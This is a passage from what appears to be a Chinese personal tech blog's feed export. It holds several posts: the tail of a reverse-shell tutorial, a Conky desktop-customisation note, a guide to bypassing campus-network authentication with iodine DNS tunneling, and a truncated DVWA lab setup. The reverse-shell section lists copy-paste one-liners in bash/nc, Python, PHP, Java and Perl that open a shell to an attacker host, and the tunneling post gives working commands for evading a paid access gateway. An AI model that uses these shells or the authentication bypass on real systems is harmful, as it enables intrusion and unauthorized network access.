<strong>TCP</strong> 4444连接到攻击者主机上；且将标准输入与标准输出相结合再次重定向给标准输出。即输入与攻击者输入命令，且接受命令输出！！！（表达能力有限）</p><p><strong>或者：</strong></p><pre><code class="shell">$ rm /tmp/reserve;mknod /tmp/reserve p;/bin/bash 0&lt;/tmp/reserve | nc 192.168.1.108 4444 1&gt;/tmp/reserve</code></pre><p>命令解释：</p><pre><code class="bash">mknod 创建管道p     创建一个FIFO，FIFO的意思即为先进先出(first-in,first-out)</code></pre><p>简单理解：首先先创建一个（先进先出）管道<code>reserve</code>，然后将一个本机交互shell重定向给管道<code>reserve</code>，再然后将输出通过 nc 重定向到攻击者那端，并且将 shell 执行结果重定向至管道<code>reserve</code>。</p></li></ul><h3 id="其他……"><a href="#其他……" class="headerlink" title="其他……"></a>其他……</h3><p>别管那么多、那么长，只管【复制粘贴】就行了 :)</p><h4 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h4><pre><code class="python">python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.1.108&quot;,8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#39;</code></pre><h4 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h4><pre><code class="php">php -r &#39;$sock=fsockopen(&quot;192.168.1.108&quot;,8080);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;</code></pre><h4 id="JAVA"><a href="#JAVA" class="headerlink" title="JAVA"></a>JAVA</h4><pre><code class="java">r = Runtime.getRuntime()p = r.exec([&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/192.168.1.108/8080;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done&quot;] as String[])p.waitFor()</code></pre><h4 id="Perl"><a href="#Perl" class="headerlink" title="Perl"></a>Perl</h4><pre><code class="perl">perl -e &#39;use Socket;$i=&quot;192.168.1.108&quot;;$p=8080;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#39;</code></pre><h2 id="NCAT"><a href="#NCAT" class="headerlink" title="NCAT"></a>NCAT</h2><p>NC 缺乏加密和身份验证的能力，营运而出一款支持加密的程序 NCAT；其包含于 NMAP 工具包中。</p><ul><li><p>被控制端</p><pre><code class="bash">$ ncat -c bash --allow 192.168.43.8 -vnl 4444 --ssl</code></pre></li><li><p>控制端</p><pre><code class="bash">$ ncat -nv 192.168.43.218 4444 --ssl</code></pre></li></ul><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li><a href="https://www.anquanke.com/post/id/87017">linux各种一句话反弹shell总结 </a></li><li><a href="https://linux.cn/article-9314-1.html">为什么应该在 Linux 上使用命名管道</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> nc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ubuntu Conky折腾笔记</title>
      <link href="2019/04/03/conky-ubuntu/"/>
      <url>2019/04/03/conky-ubuntu/</url>
      
        <content type="html"><![CDATA[<blockquote><p>Linux 系统属于开源软件，它并非开箱即用的商业产品（Windows，MacOS）。其桌面系统需要大量的定制、美化、优化，才能用起来舒畅顺滑；这也可能是无数初学者初试受挫，并最终放弃的主要原因。</p><footer><strong>OG完美主义者</strong></footer></blockquote><span id="more"></span><p><strong>所以本文就 Ubuntu 桌面美化的一次折腾做一个小笔记。</strong></p><p>说到桌面美化，就得聊到动态监视器 <strong>Conky</strong>。</p><h2 id="Conky-是什么-What？"><a href="#Conky-是什么-What？" class="headerlink" title="Conky 是什么 | What？"></a>Conky 是什么 | What？</h2><ul><li><p>Github: </p><p><a href="https://github.com/brndnmtthws/conky">https://github.com/brndnmtthws/conky</a></p></li><li><p>Youtube: </p><p><a href="https://www.youtube.com/watch?v=bHtpLEoRKmg&amp;t=19s">https://www.youtube.com/watch?v=bHtpLEoRKmg&amp;t=19s</a></p></li></ul><p>其实，简单来说。<strong>Conky</strong> 是一款免费的<strong>轻量</strong>级系统监视器，可以在桌面上显示任何类型的信息。</p><h2 id="特性-Features"><a href="#特性-Features" class="headerlink" title="特性 | Features"></a>特性 | Features</h2><p>据官方 README.md，其可显示300+个内置对象，包括支持：</p><ul><li>大量操作系统统计数据<ul><li>内核、运行时间、CPU使用、内存使用、磁盘使用、网络……</li></ul></li><li>内置 IMAP 和 POP3 </li><li>可使用内置的 Lua 支持或自己的脚本和程序进行扩展</li><li>内置 Imlib2 和 Cairo</li><li>支持 OS Linux、FreeBSD、OpenBSD、Solaris 和 macOS……<ul><li>不好意思，真没 Windows……</li></ul></li><li>……</li></ul><p><strong>可以以文本形式显示信息，也可使用简单的进度条和图形小部件以及不同的字体和颜色显示信息。</strong></p><h2 id="快速开始-Quickstart"><a href="#快速开始-Quickstart" class="headerlink" title="快速开始 | Quickstart"></a>快速开始 | Quickstart</h2><h3 id="安装-Install"><a href="#安装-Install" class="headerlink" title="安装 | Install"></a>安装 | Install</h3><p>介于我的是 Debian 系，直接使用 APT 包管理安装；其他发行版本自行解决吧！</p><pre><code class="bash">$ sudo apt install conky-all</code></pre><h3 id="配置-Configuration"><a href="#配置-Configuration" class="headerlink" title="配置 | Configuration"></a>配置 | Configuration</h3><p>其实，主要就是一份流弊的配置文件。</p><p>关于我的配置文件，其实是 <a href="https://github.com/9527tech">@Lunatic</a> 在网上收集并修改的。他首先是先在其 Arch 上完美运行，之后发布至 Github <a href="https://github.com/9527tech/conkyrc">个人仓库</a>。</p><p>由于他是 Arch，我使用他的配置文件并不能完美滴在我的系统上展现出来。</p><p>又过来很长一段时间，我又发现一位 Arch 用户<a href="https://github.com/AsucreYau">@纤魂</a> 已将 <strong>Lunatic</strong> 的配置文件魔改滴很到位，将其安装方式改的更加的简单，一个脚本的事。</p><p>随后，我就将<strong>纤魂</strong>的那个关于配置文件的仓库 fork 到我的仓库下，并作出一些变动；将 Arch Logo 删掉，并修改了启动脚本。希望有后来者可折腾出更流弊的配置文件。</p><ul><li>Lunatic<ul><li><a href="https://github.com/9527tech/conkyrc">https://github.com/9527tech/conkyrc</a></li></ul></li><li>纤魂<ul><li><a href="https://github.com/AsucreYau/conkyrc">https://github.com/AsucreYau/conkyrc</a></li></ul></li><li>本人 Forked From <a href="https://github.com/AsucreYau/conkyrc">AsucreYau/conkyrc</a><ul><li><a href="https://github.com/FanqXu/conkyrc">https://github.com/FanqXu/conkyrc</a></li></ul></li></ul><p>如果你是 Ubuntu/Debian 用户，你可以试试将本人的仓库克隆至本地；Arch 用户直接看他两的仓库吧；其他系的，如果使用的是 Gnome 桌面，也可试着来吧。</p><pre><code class="bash">$ git clone https://github.com/FanqXu/conkyrc.git</code></pre><p> 然后进入此目录开始执行安装脚本。</p><pre><code class="bash">$ cd conkyrc$ ./install.sh</code></pre><p>然后就 OK 了，如果不行就执行一条命令或者重新登录桌面。</p><pre><code class="bash">$ source ~/.xprofile</code></pre><p>关于启动脚本，以后每次开机后的5秒后开始启动 Conky 配置文件。</p><pre><code class="bash">$ bat startconky.sh───────┬──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────       │ File: startconky.sh───────┼──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────   1   │ #!/bin/bash   2   │    3   │ killall conky   4   │    5   │ # time (in s) for the DE to start; use ~20 for Gnome or KDE, less for Xfce/LXDE etc   6   │ sleep 5   7   │    8   │ # the main conky with rings   9   │ conky -c ~/.config/conky/rings --daemonize --quiet --pause=7  10   │   11   │ # time for the main conky to start; needed so that the smaller ones draw above not below (probably can be lower, but we still have to wait 5s for the rings to avoid segfaults)  12   │ sleep 1  13   │   14   │ conky -c ~/.config/conky/cpu --daemonize --quiet  15   │ conky -c ~/.config/conky/ram --daemonize --quiet  16   │ conky -c ~/.config/conky/network --daemonize --quiet  17   │ conky -c ~/.config/conky/disk --daemonize --quiet  18   │ conky -c ~/.config/conky/clock --daemonize --quiet───────┴───────────────────────────────────</code></pre><h2 id="截屏-Screenshot"><a href="#截屏-Screenshot" class="headerlink" title="截屏 | Screenshot"></a>截屏 | Screenshot</h2><p><img src="/" class="lazyload" data-src="https://raw.githubusercontent.com/FanqXu/conkyrc/master/Screenshot.png"  alt="😎😎Screenshot"></p><h2 id="定制化-Customized"><a href="#定制化-Customized" class="headerlink" title="定制化 | Customized"></a>定制化 | Customized</h2><p>这份 conky 配置文件是可以自己微调滴！不过需要会看懂 conky 配置文件的特定格式。</p><p>例如 clock 文件中的：</p><pre><code class="lua">    gap_x = 1100,    gap_y = 645,</code></pre><p>clock_rings.lua 中的：</p><pre><code class="lua">x=160, y=155,x=160, y=155,......</code></pre><p>等等……这些都是调整在屏幕中的位置的。</p><p>不仅如此，还可以调整一些其他属性，比如颜色、大小等等</p><p>……</p><h2 id="最后-Finally"><a href="#最后-Finally" class="headerlink" title="最后 | Finally"></a>最后 | Finally</h2><p>希望能够见到更流弊的 Conky 桌面吧！！！</p><h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><ul><li><a href="https://mp.weixin.qq.com/s/powz0xIdV3wPfmaLCvcEiA">https://mp.weixin.qq.com/s/powz0x……</a></li><li><a href="https://github.com/brndnmtthws/conky">https://github.com/brndnmtthws/conky</a></li><li><a href="https://github.com/9527tech/conkyrc">https://github.com/9527tech/conkyrc</a></li><li><a href="https://github.com/AsucreYau/conkyrc">https://github.com/AsucreYau/conkyrc</a></li><li><a href="https://github.com/FanqXu/conkyrc">https://github.com/FanqXu/conkyrc</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> conky </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DNS隧道绕过校园网认证</title>
      <link href="2019/03/20/Bypass-campusNet/"/>
      <url>2019/03/20/Bypass-campusNet/</url>
      
        <content type="html"><![CDATA[<p>本文在绝大数人眼里或许是篇福利文；在此文中介绍如何通过 DNS TUNNEL 的方式来绕过校园网认证，实现免认证<del>免费</del>上网；或许此招式并不是最优解，但对于绝大多数校园认证网确实能够成功实现。</p><p>怎么说呢！其实我早盯上了校园网了。</p><h2 id="场景分析-Scene-Analysis"><a href="#场景分析-Scene-Analysis" class="headerlink" title="场景分析 / Scene Analysis"></a>场景分析 / Scene Analysis</h2><h3 id="吐槽"><a href="#吐槽" class="headerlink" title="吐槽"></a>吐槽</h3><p>在某所高校中，存在一家网络运营商，主要面向毫无收入的学生们，为汝等提供日常上网冲浪。</p><p>其特点就是三字：<font color='red'><strong>贵</strong></font>、<font color='red'><strong>差</strong></font>、<font color='red'><strong>抠</strong></font>😒。每月79RMB的高昂费用；网络质量差，打游戏经常<code>460</code>；还特么只让三个设备使用，这点或许也可通过某种方式（MAC地址）绕过。</p><p>没办法，我虽不用此校园网，但还是看不下去，遂有了本文。</p><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>在这所高校的网络中，统一使用的是 WiFi 热点客户端认证方式；当连上 WiFi 后，本机会向 DHCP 服务器获取一个内网 IP；关于这个 IP 地址，起初还让我很是疑惑，没想到在资源如此匮乏的大天朝，此运营商还会分一个公网 IP 给俺；</p><p><img src="/" class="lazyload" data-src="http://i1.wp.com/ww1.sinaimg.cn/large/006V665tgy1g19hjs2yj8j30tj0akwk1.jpg"  alt="ip a"></p><p>后来才知道这是个保留地址，详见其 <a href="https://en.wikipedia.org/wiki/Reserved_IP_addresses">维基百科</a> 。</p><table><thead><tr><th align="center">Address block</th><th align="center">Scope</th><th align="center">Description</th></tr></thead><tbody><tr><td align="center">100.64.0.0/10</td><td align="center">私有网络</td><td align="center"><a href="https://en.wikipedia.org/wiki/IPv4_shared_address_space">共享地址空间</a></td></tr></tbody></table><p>在未认证前还会弹出一个下载认证客户端软件的页面，这里所用到的恶心技术就是利用 HTTP 协议的缺陷，当我们访问一个 HTTP 的网站时，网关会对这个响应报文劫持篡改，给我们302重定向到一个指定的下载认证客户端页面。而当我们打开一个 HTTPS 类型的网站是不可能被劫持的。</p><p> class="lazyload" data-src="http://i1.wp.com/ww1.sinaimg.cn/large/006V665tgy1g19hl1kyhaj30pa0h7ab7.jpg" <img src="/"></p><p>上图就是重定向后的客户端下载页面，让我匪夷所思的是最上面的那个位置本该是一个域名，为何是个公网 IP。既然没有使用域名，那何必需要 DNS，何不直接关闭53端口，为何让我如此这般有机可乘；实在让我百思不得其解🤔。</p><p>由下图可得知，DNS 53端口是开启的。</p><p><img src="/" class="lazyload" data-src="http://i1.wp.com/ww1.sinaimg.cn/large/006V665tgy1g19hlc5x1cj30e508iwgj.jpg"  alt="nslookup"></p><h3 id="原理简述"><a href="#原理简述" class="headerlink" title="原理简述"></a>原理简述</h3><p>原理其实很简单。由上述信息得知，校园网认证过程一般需要放行 DNS 和  DHCP 报文，也就是53和67/68端口。53端口既可以是 UDP，也可是 TCP；67/68端口走的是 UDP 传输协议。</p><p>本文着重点是 DNS 53端口，其实 UDP 67也可以绕过认证；但本文将围绕 DNS 53来实现绕过认证，不讨论后者。</p><p>而在这个53端口中，网关/防火墙如果不进行报文检查，那么就也将意味着，任何数据包都可以通过此端口传输；如果真的是这样的话，那就很简单了，直接 openVPN 架起，详见此文 <a href="http://zgao.top/2019/03/03/%E5%88%A9%E7%94%A8openvpn%E5%AE%9E%E7%8E%B0udp536768%E7%AB%AF%E5%8F%A3%E7%BB%95%E8%BF%87%E6%A0%A1%E5%9B%AD%E7%BD%91%E8%AE%A4%E8%AF%81%E4%B8%8A%E7%BD%91/">利用openVPN实现udp53,67,68端口绕过校园网认证上网</a> 。</p><p>但是，恰巧不幸的是，这种情况是很少存在的，也就是说53端口仅只允许 DNS 报文通过。如果是这种情况，还是有办法的。办法就是，使用 DNS 隧道。</p><p>简单来讲，既然53端口的 DNS 数据包可以通过网关/防火墙，那么就可以在本机运行一个程序，用来将其他端口数据包伪装成 DNS 数据包，发送到本地 DNS 服务器，这样网关/防火墙也不会进行拦截。但是这样仅只是将数据发送出去，如何回来呢？回来需要两个东西，一个是 VPS ，另一个就是域名。还得在域名购买商那里做如下解析设置：</p><table><thead><tr><th>主机记录</th><th>类型</th><th>值</th></tr></thead><tbody><tr><td>NS</td><td>d2t</td><td>tunnel.fanqxu.com</td></tr><tr><td>A</td><td>tunnel</td><td>148.70.218.239</td></tr></tbody></table><p>以上，d2t 和 tunnel 可以随意命名；另外，VPS 公网 IP 为148.70.218.239。还有一点就是 VPS 是某马家的学生云，在此文发布之后，或可能未续费而停掉。意思就是说，不要想着搞我服务器了，虽然公网 IP 暴露了。</p><p>然后步入正题做个假设，我们在本机 PC 上将数据包伪装成 DNS 数据，且向本地 DNS 服务器指定将要查询一个域名，而本地域名服务器收到数据后，并不能成功解析，便只能将此数据包进行转发，转发到哪里呢？请注意上表中的 NS 记录，就是用来指定一个域名由 VPS 来进行解析；所以毫无疑问，数据包顺利地到达服务器。接下来我们同样可以在 VPS 上运行一个同样的程序，用来对伪装的数据包来进行还原，然后再将还原的数据包发送到互联网中。再然后服务器就会收到回来的响应数据包，再对此响应包进行 伪装成 DNS 响应数据包，按照过来的路径，反向地将伪装好的 DNS 响应数据包发送到本机 PC，PC 收到 DNS 伪装响应包后，再对其进行还原，最终达到本机 PC 收到真正需要的数据包。</p><p><img src="/" class="lazyload" data-src="http://i1.wp.com/ww1.sinaimg.cn/large/006V665tgy1g19hlzc5fkj313t0h8dg6.jpg"  alt="flow chart"></p><h2 id="开始实战-Start-Combat"><a href="#开始实战-Start-Combat" class="headerlink" title="开始实战 / Start Combat"></a>开始实战 / Start Combat</h2><h3 id="所需"><a href="#所需" class="headerlink" title="所需"></a>所需</h3><ul><li>VPS<ul><li>Ubuntu 16 serevr</li><li>带宽 1 Mbps</li><li>IP 148.70.218.239</li></ul></li><li>Domain<ul><li>fanqxu.com</li></ul></li></ul><table><thead><tr><th>主机记录</th><th>记录</th><th>值</th></tr></thead><tbody><tr><td>NS</td><td>d2t</td><td>tunnel.fanqxu.com</td></tr><tr><td>A</td><td>tunnel</td><td>148.70.218.239</td></tr></tbody></table><ul><li>PC<ul><li>Ubuntu 18 desktop</li></ul></li></ul><h3 id="伪装程序"><a href="#伪装程序" class="headerlink" title="伪装程序"></a>伪装程序</h3><p>前面谈原理的时候，说到需要一个对数据包做 DNS 伪装的程序。而这个实现这种功能的程序有很多。</p><p>就拿我用过的两款软件来说，第一个是 dns2tcp，第二个，也就是要说的主角就是 iodine。由于前者相较于后者较复杂，使用未成功，故弃之，主要说后者。</p><p>这个小工具可以通过 DNS 服务器对 IPv4 数据进行隧道传输。有时候防火墙禁止了其他类型的流量时，而 DNS 查询流量却未被禁用时，此时就可以用来传输正常 IPv4 流量。</p><p>这个工具其实是攻击者用来通过 DNS 隧道来反弹 shell 滴！不过我是拿来突破校园网认证。</p><p>Github：<a href="https://github.com/yarrick/iodine">https://github.com/yarrick/iodine</a></p><h3 id="服务器"><a href="#服务器" class="headerlink" title="服务器"></a>服务器</h3><p>由于是 Debian 系，所以安装特简单。</p><pre><code class="shell">$ sudo apt-get install iodine</code></pre><p>然后运行起来</p><pre><code class="shell">$ sudo iodined -f -c -P password 10.0.0.1 d2t.fanqxu.com</code></pre><p>参数解释：</p><pre><code class="shell">-f 　前台运行-c 　禁用检查所有传入请求的客户端IP地址；默认情况，来自不匹配IP请求将被拒绝。-P　 设置认证密码</code></pre><p>后面那个 IP 得是一个保留地址，再然后跟一个所要查询的域名。就这样让程序在 VPS 后台运行着。</p><h3 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h3><p>同样是 Debian 系，安装方法同样。</p><pre><code class="shell">$ sudo apt-get install iodine</code></pre><p>然后运行着，不要停止。</p><pre><code class="shell">$ sudo iodine -f -P password d2t.fanqxu.com</code></pre><p>再然后，通过 ssh 服务器，使用9999端口来作为转发端口。</p><pre><code class="shell">ssh ubuntu@10.0.0.1 -D 9999</code></pre><p>不用很久，就会登录到服务器。</p><p><img src="/" class="lazyload" data-src="http://i1.wp.com/ww1.sinaimg.cn/large/006V665tgy1g19hmmdu3gj313z0p0ar2.jpg"  alt="一图概括"></p><p>当出现上图标记的那段文字，即为成功。</p><h3 id="代理"><a href="#代理" class="headerlink" title="代理"></a>代理</h3><p>开启系统自带代理</p><p> class="lazyload" data-src="http://i1.wp.com/ww1.sinaimg.cn/large/006V665tgy1g19ho5btdmj30j90dljrj.jpg" <img src="/"></p><p>或者使用浏览器插件 <a href="https://chrome.google.com/webstore/detail/proxy-switchyomega/padekgcemlokbadohgkifijomclgjgif">SwitchyOmega</a>（墙裂推荐）</p><p>Github：<a href="https://github.com/FelisCatus/SwitchyOmega">github.com/FelisCatus/SwitchyOmega</a></p><p> class="lazyload" data-src="http://i1.wp.com/ww1.sinaimg.cn/large/006V665tgy1g19hohv40aj30vk0i7mxr.jpg" <img src="/">代理服务器即本机，端口9999。</p><h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><p> class="lazyload" data-src="http://i1.wp.com/ww1.sinaimg.cn/large/006V665tgy1g19hor8njfj30l80c9mxi.jpg" <img src="/"></p><h2 id="质量-Quality"><a href="#质量-Quality" class="headerlink" title="质量 / Quality"></a>质量 / Quality</h2><h3 id="关于网速"><a href="#关于网速" class="headerlink" title="关于网速"></a>关于网速</h3><p>我绕过认证次数总共两次，第一次是在凌晨接近2点左右，那时候网速还行；而第二次在在写这篇文章的白天下午，速度是出了奇的慢，打开个百度将近十秒钟。</p><p>另外，也和我的 VPS 出口带宽有莫大的关系；毕竟只有1Mbps。</p><h3 id="未遵循标准的结果"><a href="#未遵循标准的结果" class="headerlink" title="未遵循标准的结果"></a>未遵循标准的结果</h3><p>TCP/IP 四层体系结构已明确规定各个协议的作用，如果非要在不该传输正常数据的端口中传输一切数据，那结果也可想而知。</p><h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><ul><li><p><a href="https://www.bennythink.com/udp53.html">UDP 53 免费上网、DNS 隧道经验谈</a></p></li><li><p><a href="http://zgao.top/2019/03/03/%E5%88%A9%E7%94%A8openvpn%E5%AE%9E%E7%8E%B0udp536768%E7%AB%AF%E5%8F%A3%E7%BB%95%E8%BF%87%E6%A0%A1%E5%9B%AD%E7%BD%91%E8%AE%A4%E8%AF%81%E4%B8%8A%E7%BD%91/">利用openVPN实现udp53,67,68端口绕过校园网认证上网</a></p></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> DNS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Web渗透平台DVWA搭建</title>
      <link href="2019/01/14/DVWA/"/>
      <url>2019/01/14/DVWA/</url>
      
        <content type="html"><![CDATA[<p> <strong><em><u>环境：</u></em></strong></p><ul><li>物理机 Ubuntu 18.04 desktop</li><li>VirtualBox 5.2.18_Ubuntu</li><li>服务器 Ubuntu 16.04 server</li><li>DVWA <ul><li><a href="https://github.com/ethicalhack3r/DVWA">https://github.com/ethicalhack3r/DVWA</a></li><li><a href="http://dvwa.co.uk/">http://dvwa.co.uk/</a></li></ul></li></ul><p> class="lazyload" data-src="http://i1.wp.com/ww1.sinaimg.cn/large/006V665tgy1fz5zv6qy79j30rk0lygms.jpg" <img src="/"></p><p>此文分为三部分，第一部分为服务器的安装，第二部分为基本环境配置，第三部分为 DVWA 的部署。</p><h2 id="0x00-安装-Ubuntu-服务器"><a href="#0x00-安装-Ubuntu-服务器" class="headerlink" title="0x00 安装 Ubuntu 服务器"></a>0x00 安装 Ubuntu 服务器</h2><p>将 Ubuntu 16.04 server 安装至 VirtualBox ，当然安装到 VMware 中也行；其中一些简单的步骤并为截图。</p><p> class="lazyload" data-src="http://i1.wp.com/ww1.sinaimg.cn/large/006V665tgy1fz5zv6py3yj30hs0dcglg.jpg" <img src="/"></p><p>我的主机名，**<em>webServ**</em> </p><p> class="lazyload" data-src="http://i1.wp.com/ww1.sinaimg.cn/large/006V665tgy1fz5zv6pvaxj30m80goq2r.jpg" <img src="/"></p><p>设置用户名，亲测 <strong><em>admin</em></strong> 不可以 😂</p><p> class="lazyload" data-src="http://i1.wp.com/ww1.sinaimg.cn/large/006V665tgy1fz5zv6q9v5j30m80godfo.jpg" <img src="/"></p><p>不要加密家目录</p><p> class="lazyload" data-src="http://i1.wp.com/ww1.sinaimg.cn/large/006V665tgy1fz5zv6tdecj30m80go0sk.jpg" <img src="/"></p><p>将更改写入磁盘</p><p> class="lazyload" data-src="http://i1.wp.com/ww1.sinaimg.cn/large/006V665tgy1fz5zv6tk6bj30m80go744.jpg" <img src="/"></p><p>不自动更新</p><p> class="lazyload" data-src="http://i1.wp.com/ww1.sinaimg.cn/large/006V665tgy1fz5zv6t30lj30m80go745.jpg" <img src="/"></p><p>这里是重点，需选择如图所示三项，其中 <strong>LAMP</strong> 即分别为 Linux 、Apache、MySQL、PHP。</p><p> class="lazyload" data-src="http://i1.wp.com/ww1.sinaimg.cn/large/006V665tgy1fz5zv6uw1hj30m80goglg.jpg" <img src="/"></p><p>设置 MySQL 的 root 密码</p><p> class="lazyload" data-src="http://i1.wp.com/ww1.sinaimg.cn/large/006V665tgy1fz5zv6xcrbj30m80goq2r.jpg" <img src="/"></p><p>完成安装后重启</p><p> class="lazyload" data-src="http://i1.wp.com/ww1.sinaimg.cn/large/006V665tgy1fz5zv6xlidj30m80gowec.jpg" <img src="/"></p><p>本地物理机 ssh 连上服务器</p><p> class="lazyload" data-src="http://i1.wp.com/ww1.sinaimg.cn/large/006V665tgy1fz60cpy7jdj31cj0jgwni.jpg" <img src="/"></p><h2 id="0x01-基本环境配置"><a href="#0x01-基本环境配置" class="headerlink" title="0x01 基本环境配置"></a>0x01 基本环境配置</h2><h3 id="卸载-PHP7"><a href="#卸载-PHP7" class="headerlink" title="卸载 PHP7"></a>卸载 PHP7</h3><p>由于我们需要的是 <em>PHP5</em> ，故通过下面一条命令将之前安装系统时装的 <strong>LAMP</strong> 中的 <em>PHP7</em> 卸载掉。</p><pre><code class="bash">$ sudo apt-get purge `dpkg -l | grep php| awk &#39;&#123;print $2&#125;&#39; |tr &quot;\n&quot; &quot; &quot;`</code></pre><h3 id="安装-PHP5"><a href="#安装-PHP5" class="headerlink" title="安装 PHP5"></a>安装 PHP5</h3><p>添加 <em>PHP5</em> 的 <strong><em>ppa</em></strong> 源</p><pre><code class="bash">$ sudo add-apt-repository ppa:ondrej/php</code></pre><p>更新索引</p><pre><code class="bash">$ sudo apt-get update</code></pre><p>更新系统所有软件</p><pre><code class="bash">$ sudo apt-get upgrade</code></pre><p>安装 <em>PHP5</em></p><pre><code class="BASH">$ sudo apt-get install php5.6</code></pre><h3 id="依赖性"><a href="#依赖性" class="headerlink" title="依赖性"></a>依赖性</h3><p>安装依赖</p><pre><code class="bash">$ sudo apt-get install php5.6-mbstring php5.6-mcrypt php5.6-mysql php5.6-xml</code></pre><p>再次查看 <strong>PHP</strong> 版本</p><pre><code class="bash">$ php -vPHP 5.6.40-1+ubuntu16.04.1+deb.sury.org+1 (cli) Copyright (c) 1997-2016 The PHP GroupZend Engine v2.6.0, Copyright (c) 1998-2016 Zend Technologies    with Zend OPcache v7.0.6-dev, Copyright (c) 1999-2016, by Zend Technologies</code></pre><h3 id="Apache"><a href="#Apache" class="headerlink" title="Apache"></a>Apache</h3><p>开启 <em>Apache</em> 服务</p><pre><code class="bash">$ sudo service apache2 start</code></pre><p>完成后可以打开本地网页查看 <em>Apache</em> 服务是否正常，此处的 <em>URL</em> 为服务器的 IP 地址。</p><ul><li><a href="http://192.168.43.218/">http://192.168.43.218</a></li></ul><p> class="lazyload" data-src="http://i1.wp.com/ww1.sinaimg.cn/large/006V665tgy1fz5zv70dvtj30vg0n83zw.jpg" <img src="/"></p><p>启用 <em>Apache</em> 中的 <em>PHP5.6</em> 模块</p><pre><code class="bash">$ sudo a2enmod php5.6perl: warning: Setting locale failed.perl: warning: Please check that your locale settings:        LANGUAGE = (unset),        LC_ALL = (unset),        LC_PAPER = &quot;zh_CN.UTF-8&quot;,        LC_ADDRESS = &quot;zh_CN.UTF-8&quot;,        LC_MONETARY = &quot;zh_CN.UTF-8&quot;,        LC_NUMERIC = &quot;zh_CN.UTF-8&quot;,        LC_TELEPHONE = &quot;zh_CN.UTF-8&quot;,        LC_IDENTIFICATION = &quot;zh_CN.UTF-8&quot;,        LC_MEASUREMENT = &quot;zh_CN.UTF-8&quot;,        LC_CTYPE = &quot;en_US.UTF-8&quot;,        LC_TIME = &quot;zh_CN.UTF-8&quot;,        LC_NAME = &quot;zh_CN.UTF-8&quot;,        LANG = &quot;en_US.UTF-8&quot;    are supported and installed on your system.perl: warning: Falling back to a fallback locale (&quot;en_US.UTF-8&quot;).Considering dependency mpm_prefork for php5.6:Considering conflict mpm_event for mpm_prefork:Considering conflict mpm_worker for mpm_prefork:Module mpm_prefork already enabledConsidering conflict php5 for php5.6:Module php5.6 already enabled</code></pre><p>重启 <em>Apache</em> 服务</p><pre><code class="bash">$ sudo service apache2 restart</code></pre><h2 id="0x02-DVWA-部署"><a href="#0x02-DVWA-部署" class="headerlink" title="0x02 DVWA 部署"></a>0x02 DVWA 部署</h2><h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><p>下载 <em>DVWA</em> 到本地服务器</p><pre><code class="bash">$ sudo wget https://github.com/ethicalhack3r/DVWA/archive/master.zip</code></pre><p>解压到相应目录</p><pre><code class="bash">$ sudo apt-get install unzip$ sudo unzip DWVA-master.zip -d /var/www/html/dvwa</code></pre><p>这时就可以打开 <em>Web</em> 界面</p><ul><li><a href="http://192.168.43.218/DVWA/setup.php">http://192.168.43.218/DVWA/setup.php</a></li></ul><p> class="lazyload" data-src="http://i1.wp.com/ww1.sinaimg.cn/large/006V665tgy1fz5zv6zixuj30vd0n8glo.jpg" <img src="/"></p><p>提示需将一个配置文件修改名字</p><pre><code class="bash">$ cd /var/www/html/dvwa/config/$ sudo mv config.inc.php.dist config.inc.php</code></pre><p>再次打开 <em>Web</em> 界面</p><h3 id="选项及-PHP-模块-gd"><a href="#选项及-PHP-模块-gd" class="headerlink" title="选项及 PHP 模块 gd"></a>选项及 PHP 模块 gd</h3><blockquote><p>此后，就根据Web界面的提示依次完成相应配置</p></blockquote><p>开启 <em>allow_url_include</em>，</p><pre><code class="bash">$ sudo vi /etc/php/5.6/apache2/php.ini</code></pre><p>开启这个就可让 <em>include include_once require</em> 和 <em>require_once</em> 都能用 <em>url</em> 和伪协议</p><pre><code class="bash">allow_url_include = On</code></pre><p>安装 <em>PHP</em> 的一个模块</p><pre><code class="bash">$ sudo apt-get install php5.6-gd</code></pre><p>打开 <em>Web</em> 界面查看</p><p> class="lazyload" data-src="http://i1.wp.com/ww1.sinaimg.cn/large/006V665tgy1fz5zv72obbj30p50pjgmk.jpg" <img src="/"></p><h3 id="秘钥"><a href="#秘钥" class="headerlink" title="秘钥"></a>秘钥</h3><p>下一个就是 <em>reCAPTCHA key</em>，这个就有点麻烦，可能得需一个<em>Google</em>账号加科学上网。首先打开 <em>dvwa</em> 目录下的 <em>config</em> 目录下的一个配置文件。</p><pre><code class="bash">$ sudo vi dvwa/config/config.inc.php</code></pre><p>打开后找到一下字段……</p><pre><code class="bash"># ReCAPTCHA settings#   Used for the &#39;Insecure 